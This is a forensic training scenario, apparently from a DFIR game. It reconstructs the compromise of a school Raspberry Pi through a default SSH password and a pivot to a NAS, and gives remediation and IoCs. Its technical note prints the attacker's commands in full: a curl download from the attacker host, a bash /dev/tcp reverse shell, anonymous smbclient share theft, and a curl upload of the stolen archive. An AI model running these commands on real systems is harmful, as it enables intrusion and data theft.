---
title: The Workshop Raspberry
number: 5
released: 2026-10-23
pages: 15

cover: assets/covers/the-workshop-raspberry.jpg
pdf: assets/pdf/DFIR_Chronicles_The_Workshop_Raspberry.pdf

techniques: [T1133, T1110.001, T1078.001, T1021.004, T1105, T1053.003, T1059.004, T1036.005, T1571, T1016, T1018, T1021.002, T1039, T1560.001, T1048.003, T1070.004]
tags: [IoT, Linux, SMB, Lateral movement]

# Earliest version of DFIR Chronicles: The Game that ships this level.
# Later versions carry it too, so the site shows it as "and later".
game_version: 0.2.0

# The SIEM line that opened the case. Feeds the SOC ticker on the home page.
alert: 02:00 IDS — SSH login to lab-pi-07 from 80.94.92.17, user=labuser, after 2 failed passwords

# One line for the card and the billboard.
hook: >-
  A student-built Raspberry Pi with a factory password and an open port
  forward. The sensor box was never the target: the NAS behind it was.
---

# The Workshop Raspberry

## Back cover

In this episode of The DFIR Chronicles, cyber-investigator Dylan Log, analyst Cyra Neuron, and forensic prodigy Byte get a call from Alexander, the lab technician of a technical high school, over a login that happened while the whole school was asleep.

The school has no SOC. It has Alexander, a coffee going cold, and an IDS console he checks at the start of every morning shift. On this morning, it is waiting for him: an SSH session to `lab-pi-07` from `80.94.92.17` on 24 September 2026 at 02:00 UTC — and nobody was anywhere near the automation lab at two in the morning. `lab-pi-07` is not a server, not a crown jewel, just a palm-sized Raspberry Pi that reads the workshop temperature sensors and whispers them to an MQTT broker. But to check the readings from home, the student who built it had punched a port-forward through the workshop router, and that one convenience left the Pi's SSH port hanging open to the entire internet. Worse, the account that ran the whole thing — `labuser` — still wore the factory default password it shipped with. Alexander pulls the Pi off the network before he picks up the phone, and Byte images it with Velociraptor, so the whole story is frozen on a single SD card. The brief is simple and merciless: how did they get in, what did they touch, did they reach anything else on the workshop LAN and take data from it, did they leave something that survives a reboot — and what has to be fixed before the next bell.

Dylan starts where every intrusion starts: the door. The authentication log tells it in three lines — two `Failed password` rows for `labuser`, then one `Accepted password`, all from `80.94.92.17`, all inside eleven seconds. A guessed password over an SSH port that should never have faced the internet. Twenty-five seconds of recon — `id`, `uname -a`, `ls sensors/` — and the intruder knows they are standing on a Raspberry Pi OS 12 sensor box. Then a `curl` pulls a tiny script into `~/.config/mqtt/mq.sh`, a name that blends perfectly into the Pi's real job, and a `*/5` crontab line quietly promises to run it every five minutes, forever. Inside, the script is no keepalive at all: it is a bash reverse shell that phones `80.94.92.17` on port `4444`. Cron fires at 02:05 and the channel comes alive — and it is still `ESTABLISHED` when Byte images the host.

But the Pi was never the prize. Cyra follows the next thread and sees the pivot for what it is. A `cat /proc/net/arp` lights up the local segment, and the NAS `lab-nas-01` answers at `192.168.4.20`. The attacker points `smbclient` at it with no credentials at all — `-N`, a null session — and the file server, configured with an anonymous "public" share called `shared`, simply hands over everything in it. A `recurse ON; mget *` drags the `students/` folder down to the Pi, `tar` packs it into a hidden archive at `/tmp/.cache.tgz`, and a single `curl -F` ships it off to the attacker's HTTP listener on port `8080`. This is **T1021** (Remote Services, over SSH then SMB) feeding **T1039** (Data from Network Shared Drive) — a throwaway IoT sensor used as a stepping stone to the one box that held student data.

Byte closes the loop on the cleanup. The attacker tried to tidy up — `rm -rf` erased the extracted copy of the students' files from `labuser`'s home — but the staged archive in `/tmp` was left exactly where it sat, hidden, hashable, and still there at imaging time. In a world where the cheapest device on the network is the one that opens the door, The DFIR Chronicles remind us: a sensor that costs less than lunch should never be able to read the files that matter — and a default password left on one is an invitation with the address already filled in.

## Technical note

The device was isolated by the school's lab technician after he spotted the IDS alert at the start of the morning shift (2026-09-24 08:12 UTC), then imaged with Velociraptor before analysis, so every step below runs a collected artifact against the single acquired image, falling back to a direct file read only where no catalog artifact covers the question. The investigation runs in five movements — entry, actions, persistence, lateral movement, exfiltration — and closes with the resolution and the IoC package. **T-zero** for this timeline is the attacker's first failed SSH password at **2026-09-24 02:00:00 UTC**. For reference, the host fingerprint from `uname -a` is:

```text
Linux lab-pi-07 6.6.31+rpt-rpi-v8 #1 SMP PREEMPT Debian 1:6.6.31-1+rpt1 (2024-05-29) aarch64 GNU/Linux
```

`lab-pi-07` is a Raspberry Pi OS 12 (bookworm) sensor gateway on `eth0 192.168.4.7/24` (MAC `dc:a6:32:4b:8e:11`), gateway/DNS `192.168.4.1`. Its legitimate workload is a `python3` publisher (`sensors/publish.py`) holding an outbound session to the MQTT broker at `192.168.4.10:1883` — background noise that must be recognized and set aside.

### 1. SSH entry point: a failed-then-accepted password from an external IP

**Goal.** Establish how the attacker got in. Successful and failed SSH authentications are recorded in the system auth log, and a cluster of failures followed immediately by a success from one source is the classic signature of a guessed password.

**Action.** Run the `Custom.Linux.Sys.RSyslogSSHLogin` artifact, which parses `/var/log/auth.log` and returns one row per SSH attempt with `Time`, `IP`, `Result` (Accepted/Failed), `Method`, `AttemptedUser` and `Port`.

**Finding.** The artifact returns four relevant rows:

| Time (UTC) | IP | Result | Method | User | Port |
|------------|----|--------|--------|------|------|
| 2026-09-21 02:30:00 | 192.168.4.50 | Accepted | password | labuser | 49812 |
| 2026-09-24 02:00:00 | 80.94.92.17 | Failed | password | labuser | 51322 |
| 2026-09-24 02:00:05 | 80.94.92.17 | Failed | password | labuser | 51322 |
| 2026-09-24 02:00:11 | 80.94.92.17 | Accepted | password | labuser | 51322 |

The first row is baseline: `labuser` logging in from the lab workstation `192.168.4.50` almost three days earlier for routine sensor maintenance. The three rows from `80.94.92.17` are the intrusion — two failures then an acceptance inside eleven seconds, from a routable public address. The raw log confirms the session was then opened by PAM:

```text
Sep 24 02:00:11 lab-pi-07 sshd[1874]: Accepted password for labuser from 80.94.92.17 port 51322 ssh2
Sep 24 02:00:11 lab-pi-07 sshd[1874]: pam_unix(sshd:session): session opened for user labuser(uid=1000) by (uid=0)
```

A quick look at the SSH daemon configuration explains why a remote password login was even possible:

```bash
grep -i passwordauthentication /etc/ssh/sshd_config
```

```text
PasswordAuthentication yes
```

`grep -i` searches case-insensitively for the directive. With `PasswordAuthentication yes` set (and `Port 22` reachable from the internet via the router port-forward), an attacker who could guess `labuser`'s factory default password needed nothing else. This maps to **T1133** (External Remote Services), **T1110.001** (Brute Force: Password Guessing) and **T1078.001** (Valid Accounts: Default Accounts), delivering **T1021.004** (Remote Services: SSH).

### 2. Attacker shell history: recon, download, cron, SMB, tar, exfil

**Goal.** The login is only the entry point. Linux records the commands the account typed, so the shell history reconstructs the entire session in order.

**Action.** Run `Custom.Linux.Sys.ShellHistory`, which returns the shell history for every user as `OSPath`, `LineNum`, `Command`, `Timestamp`. For `labuser` it reads `/home/labuser/.bash_history`.

**Finding.** The relevant portion of `labuser`'s history, in order (the first two lines, `vcgencmd measure_temp` and a `systemctl status mqtt-publish.service`, are prior legitimate maintenance and are excluded):

```bash
id
uname -a
ls sensors/
mkdir -p /home/labuser/.config/mqtt
curl -s http://80.94.92.17:8080/mq.sh -o /home/labuser/.config/mqtt/mq.sh
chmod +x /home/labuser/.config/mqtt/mq.sh
crontab -e
cat /proc/net/arp
smbclient -L //192.168.4.20 -N
smbclient //192.168.4.20/shared -N -c 'recurse ON; prompt OFF; mget *'
tar czf /tmp/.cache.tgz students
curl -s -F f=@/tmp/.cache.tgz http://80.94.92.17:8080/up
rm -rf /home/labuser/students
exit
```

This is the whole intrusion in plaintext, and each later step follows one thread of it:

1. **Recon** — `id`, `uname -a`, `ls sensors/` confirm the account's groups, the kernel/arch, and that this is a sensor box (**T1033**, **T1082**).
2. **Tooling** — `curl` downloads a script over the attacker's HTTP port `8080` into `~/.config/mqtt/mq.sh` and `chmod +x` makes it executable (**T1105** Ingress Tool Transfer).
3. **Persistence** — `crontab -e` installs a scheduled job (Step 3).
4. **Lateral movement** — `cat /proc/net/arp` then two `smbclient` commands against `192.168.4.20` (Step 4).
5. **Collection/exfiltration** — `tar` stages the stolen files and `curl -F` uploads them (Step 5), then `rm -rf` removes the extracted copy.

The artifact timestamps let the session be placed on the wall clock: `id` at 2026-09-24 02:00:25, the `curl` download at 02:01:20, `crontab -e` at 02:01:45, `cat /proc/net/arp` at 02:02:30, the share enumeration at 02:02:55, the share download at 02:03:20, the `tar` at 02:03:50, and the exfil `curl` at 02:04:10 — a four-minute, hands-on-keyboard session.

### 3. Persistence: a user crontab running a disguised reverse shell

**Goal.** Determine whether the attacker left anything that runs again on its own. A user crontab is a cheap, reboot-surviving way to keep access.

**Actions.** Run `Linux.Sys.Crontab` to enumerate cron entries, then read the single script it points at (a specific, non-standard file that no catalog artifact covers, so `cat` is the right tool).

```bash
cat /home/labuser/.config/mqtt/mq.sh
```

`Linux.Sys.Crontab` returns `OSPath`, `User`, the five schedule fields and `Command`. It surfaces one anomalous entry:

```text
OSPath                                   User     Min Hr DoM Mon DoW  Command
/var/spool/cron/crontabs/labuser         labuser  */5 *  *   *   *    /home/labuser/.config/mqtt/mq.sh >/dev/null 2>&1
```

The `*/5` in the minute field means "every five minutes". Confirming against the stored crontab:

```bash
crontab -l -u labuser
```

```text
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.ab12Xk installed on Sep 24 02:01)
# (Cron version -- $Id$)
*/5 * * * * /home/labuser/.config/mqtt/mq.sh >/dev/null 2>&1
```

The install comment timestamp (`Sep 24 02:01`) aligns with the `crontab -e` line in the history and with the `crontab[2104]: (labuser) REPLACE (labuser)` entry in `/var/log/syslog`. Reading the script the job runs reveals it is not a keepalive at all:

```bash
#!/bin/bash
# mqtt keepalive
bash -i >& /dev/tcp/80.94.92.17/4444 0>&1
```

This is a bash reverse shell: `bash -i` starts an interactive shell and `>& /dev/tcp/80.94.92.17/4444 0>&1` redirects its standard input, output and error through a TCP connection to `80.94.92.17:4444` (bash's built-in `/dev/tcp/<host>/<port>` pseudo-device). The `# mqtt keepalive` comment and the `~/.config/mqtt/` location are deliberate camouflage, coherent with the Pi's real MQTT role. The file is 71 bytes, mode `0755`, owned by `labuser`, and hashes to:

```text
0e82ad111fdee7bf68fe8c5587650c71747e15eccc685c744e3b9ea2fe03b4d6  /home/labuser/.config/mqtt/mq.sh
```

Because cron re-runs it every five minutes, access returns on its own and survives a reboot. This is **T1053.003** (Scheduled Task/Job: Cron) carrying a **T1059.004** (Unix Shell) reverse shell, masqueraded per **T1036.005** (Match Legitimate Name or Location), beaconing to a non-standard port (**T1571**).

### 4. Lateral movement: ARP recon and a live channel identify the NAS pivot

**Goal.** The history shows the attacker inspecting the local network and then talking to another host. Confirm which internal device they reached and that a channel is still open.

**Actions.** Run `Linux.Proc.Arp` to read the kernel ARP neighbour cache and `Linux.Network.NetstatEnriched` to list active connections with their owning process.

`Linux.Proc.Arp` (equivalent to reading `/proc/net/arp`) returns `IP`, `MAC` and `Device` for each L2 neighbour the Pi has recently spoken to:

| IP | MAC | Device | Role |
|----|-----|--------|------|
| 192.168.4.1 | 00:1a:2b:3c:4d:5e | eth0 | gateway / DNS |
| 192.168.4.10 | b8:27:eb:14:22:aa | eth0 | MQTT broker |
| 192.168.4.20 | 00:11:32:2a:9c:40 | eth0 | NAS `lab-nas-01` |

The NAS at `192.168.4.20` sits on the same `/24` as the Pi (`192.168.4.7`), so it appears as a direct L2 neighbour — exactly the host the attacker enumerated with `cat /proc/net/arp` immediately before the `smbclient` commands (**T1016** System Network Configuration Discovery, **T1018** Remote System Discovery).

`Linux.Network.NetstatEnriched` returns each socket with its state and owning process (`Protocol`, `LocalAddress`, `LocalPort`, `RemoteAddress`, `RemotePort`, `State`, `Username`, `PID`, `Name`, `Exe`, `Cmdline`). Three rows matter:

| Proto | Local | Remote | State | User | PID | Process |
|-------|-------|--------|-------|------|-----|---------|
| tcp | 0.0.0.0:22 | — | LISTEN | root | 742 | sshd |
| tcp | 192.168.4.7:48210 | 192.168.4.10:1883 | ESTABLISHED | labuser | 1203 | python3 `sensors/publish.py` |
| tcp | 192.168.4.7:51944 | 80.94.92.17:4444 | ESTABLISHED | labuser | 2261 | bash `-i` |

The first two are expected: the SSH listener and the legitimate MQTT publisher. The third is the live reverse shell — a `bash -i` process owned by `labuser` holding an `ESTABLISHED` session to `80.94.92.17:4444`. The process tree confirms its origin: `cron` (PID 803) → `/bin/bash /home/labuser/.config/mqtt/mq.sh` (PID 2260) → `bash -i` (PID 2261). Cron first fired at 02:05:00 (visible as `CRON[2259]: (labuser) CMD (...mq.sh...)` in syslog) and again at 02:10:00; the session was still open at imaging. Together with the `smbclient -N` lines from the history, this proves the Pi was used to pivot into the internal NAS over an anonymous SMB share — the lateral-movement core of the case (**T1021.002** SMB).

The two `smbclient` commands are what carried the pivot:

```bash
smbclient -L //192.168.4.20 -N
smbclient //192.168.4.20/shared -N -c 'recurse ON; prompt OFF; mget *'
```

`smbclient -L //192.168.4.20` lists the shares exported by the NAS, and `-N` suppresses the password prompt — a null (anonymous) session. Because the NAS exposes an anonymous "public" share, this succeeds with no credentials. The second command connects to the `shared` share, again with `-N`, and runs a scripted batch (`-c`): `recurse ON` descends into subdirectories, `prompt OFF` disables per-file confirmation, and `mget *` downloads everything, preserving the remote tree into the current local directory. That is how the `students/` folder from the NAS landed under `/home/labuser/` on the Pi — no password, and no root on the Pi required.

### 5. Exfiltration: the staged archive, its hash, and the upload destination

**Goal.** Establish what was taken. The attacker packaged the files pulled from the NAS into a hidden archive in `/tmp` before sending them out.

**Actions.** Run `Linux.Detection.AnomalousFiles` to flag hidden or unusual files under `/home` and `/tmp`, then checksum the one it surfaces (a one-off hash with no artifact equivalent, so `sha256sum` is the right tool).

```bash
sha256sum /tmp/.cache.tgz
```

`Linux.Detection.AnomalousFiles` returns `OSPath`, `Mode`, `Size`, `Uid`, `Gid`, `Mtime`, `IsHidden`, `IsLarge`, `IsSUID` and an `Anomaly` reason. Two rows are relevant:

| OSPath | Mode | Size | Uid/Gid | Mtime | Hidden | Anomaly |
|--------|------|------|---------|-------|--------|---------|
| /tmp/.cache.tgz | 0600 | 486532 | 1000/1000 | 2026-09-24 02:03:50 | Y | hidden file in /tmp |
| /home/labuser/.config/mqtt/mq.sh | 0755 | 71 | 1000/1000 | 2026-09-24 02:01:20 | N | executable in hidden config dir |

The archive `/tmp/.cache.tgz` is the staged copy of the stolen share: created at 02:03:50 (matching the `tar czf /tmp/.cache.tgz students` line in the history), hidden by the leading dot, owned by `labuser`. Its hash is the exfiltration IoC:

```text
9de2749c49dfec966324b50dfd07b529734e77258f7d3948a96b6aa9c00a3756  /tmp/.cache.tgz
```

Cross-reading the history, the file was then uploaded:

```bash
curl -s -F f=@/tmp/.cache.tgz http://80.94.92.17:8080/up
```

`curl -F f=@/tmp/.cache.tgz` performs a `multipart/form-data` POST with the archive attached as form field `f` (the `@` prefix tells curl to read file contents), to `http://80.94.92.17:8080/up` — the same attacker host, over its HTTP port. `-s` runs silently. This is **T1560.001** (Archive Collected Data via Utility — `tar`) feeding **T1039** (Data from Network Shared Drive) and **T1048.003** (Exfiltration Over Unencrypted Non-C2 Protocol — HTTP).

The attacker then ran `rm -rf /home/labuser/students` to remove the extracted copy (**T1070.004** File Deletion) and logged out — but left the staged `/tmp/.cache.tgz` archive and the cron persistence in place. That incomplete cleanup is exactly why the stolen data is still recoverable and hashable on the image.

### 6. Expected resolution

**Root cause.** The workshop Raspberry Pi `lab-pi-07` exposed SSH to the internet through a router port-forward while the primary account `labuser` still used its factory default password. With `PasswordAuthentication yes` in `sshd_config`, the attacker guessed the password from `80.94.92.17` after two failures and logged in.

**Attacker actions (chronological).**

1. Guessed the default SSH password of `labuser` from `80.94.92.17` (two Failed, then Accepted) at 02:00:11 UTC.
2. Ran quick recon: `id`, `uname -a`, `ls sensors/`.
3. Downloaded a reverse-shell script to `~/.config/mqtt/mq.sh` via `curl` from `80.94.92.17:8080` and made it executable.
4. Installed a user crontab (`*/5`) to run the script, disguised as an MQTT keepalive, for persistence.
5. Enumerated the local segment with `cat /proc/net/arp` and found the NAS at `192.168.4.20`.
6. Listed and downloaded the `shared` share from `lab-nas-01` over an anonymous SMB null session (`smbclient -N`).
7. Staged the stolen files into `/tmp/.cache.tgz` and exfiltrated them to `80.94.92.17:8080` with `curl -F`.
8. Removed the extracted `~/students` copy and logged out — but left the staged archive and the cron persistence behind.

**Persistence mechanism.** A user crontab entry for `labuser` (`*/5 * * * * /home/labuser/.config/mqtt/mq.sh >/dev/null 2>&1`) that runs a bash reverse shell to `80.94.92.17:4444`, so access returns every five minutes and survives a reboot. The channel was `ESTABLISHED` at imaging (PIDs 2260 → 2261).

**Affected assets.**

- `lab-pi-07` — the compromised Raspberry Pi foothold.
- `labuser` — the compromised local account (factory default password).
- `lab-nas-01` (`192.168.4.20`) — the pivoted-to file server.
- The `shared` share on the NAS — exfiltrated student data.

**Recommended remediation.**

- Remove the router port-forward so SSH is no longer reachable from the internet.
- Rotate the `labuser` password and set `PasswordAuthentication no`, switching to SSH keys.
- Delete the crontab entry and the `/home/labuser/.config/mqtt/mq.sh` script, and kill the reverse-shell processes (PIDs 2260 and 2261).
- Block `80.94.92.17` and the C2 port `4444` at the firewall.
- Segment the Pi away from the NAS with a VLAN or firewall rule so IoT devices cannot reach the file server.
- Disable anonymous/guest access on the NAS and require authentication on the `shared` share; assess what student data was exposed.

**Incident playbook.**

- **Containment.** Keep `lab-pi-07` isolated (already imaged); kill PIDs 2260 and 2261 and block `80.94.92.17` at the perimeter; remove the router port-forward exposing port 22.
- **Eradication.** Delete the `labuser` crontab entry and the script; rotate the password and disable SSH password authentication; disable anonymous SMB on the NAS and require authenticated access to `shared`.
- **Recovery.** Rebuild or verify the Pi from a known-good image and re-enable only the sensor publisher; restore NAS access controls and confirm the reverse shell no longer reconnects.
- **Lessons learned.** IoT and lab devices must never keep factory default credentials or be port-forwarded to the internet; segment low-trust devices away from file servers (a cheap sensor should not be able to read the students' share); turn off anonymous SMB shares, require authentication, and audit access on the NAS.

### 7. Key IoCs for the school's firewall and IDS

| Type | Indicator | Notes |
|------|-----------|-------|
| IP | `80.94.92.17` | External source of the SSH login; C2 and exfiltration host |
| Port | `4444/tcp` | Reverse-shell C2 port on the attacker host |
| Port | `8080/tcp` | Attacker HTTP port serving `mq.sh` and receiving the exfiltrated archive |
| Account | `labuser` | Compromised local account (factory default password) |
| Path | `/home/labuser/.config/mqtt/mq.sh` | Reverse-shell script disguised as an MQTT keepalive (71 bytes, mode 0755) |
| SHA-256 | `0e82ad111fdee7bf68fe8c5587650c71747e15eccc685c744e3b9ea2fe03b4d6` | Hash of the reverse-shell script |
| Command | `*/5 * * * * /home/labuser/.config/mqtt/mq.sh >/dev/null 2>&1` | Persistence: user crontab entry |
| Path | `/tmp/.cache.tgz` | Staged archive of the stolen NAS files left in `/tmp` (hidden, 486532 bytes) |
| SHA-256 | `9de2749c49dfec966324b50dfd07b529734e77258f7d3948a96b6aa9c00a3756` | Hash of the staged exfiltration archive |
| Access | Anonymous SMB to `192.168.4.20/shared` | Null-session (`smbclient -N`) read of the NAS `shared` share |

**MITRE ATT&CK mapping.** T1133 (External Remote Services); T1110.001 (Brute Force: Password Guessing); T1078.001 (Valid Accounts: Default Accounts); T1021.004 (Remote Services: SSH); T1105 (Ingress Tool Transfer); T1053.003 (Scheduled Task/Job: Cron); T1059.004 (Command and Scripting Interpreter: Unix Shell); T1036.005 (Masquerading: Match Legitimate Name or Location); T1571 (Non-Standard Port); T1016 (System Network Configuration Discovery); T1018 (Remote System Discovery); T1021.002 (Remote Services: SMB/Windows Admin Shares); T1039 (Data from Network Shared Drive); T1560.001 (Archive Collected Data: Archive via Utility); T1048.003 (Exfiltration Over Alternative Protocol: Unencrypted Non-C2); T1070.004 (Indicator Removal: File Deletion). Primary tactic: **Lateral Movement** (T1021, T1039), with Persistence (T1053.003) and Collection/Exfiltration as documented secondary TTPs.
